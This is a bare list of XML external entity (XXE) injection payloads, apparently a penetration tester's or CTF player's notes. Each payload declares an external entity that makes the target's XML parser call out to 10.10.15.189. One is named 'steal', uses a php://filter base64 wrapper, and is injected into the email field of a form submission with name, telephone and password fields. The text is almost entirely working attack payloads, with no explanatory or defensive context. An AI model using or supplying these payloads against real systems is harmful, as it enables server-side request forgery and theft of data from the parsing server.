<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.15.189/test2.php"> ]>
	
	<!DOCTYPE foo [  

<!ELEMENT foo (#ANY)>

<!ENTITY xxe SYSTEM "https://10.10.15.189/test.php">]><foo>&xxe;</foo>
	
	
	
	<!DOCTYPE root [<!ENTITY steal SYSTEM "php://filter/convert.base64-encode/resource=//10.10.15.189/WhatEver">]>
	
<root><name>test</name><tel>021212</tel><email>&steal;</email><password>pwd</password></root>‌
	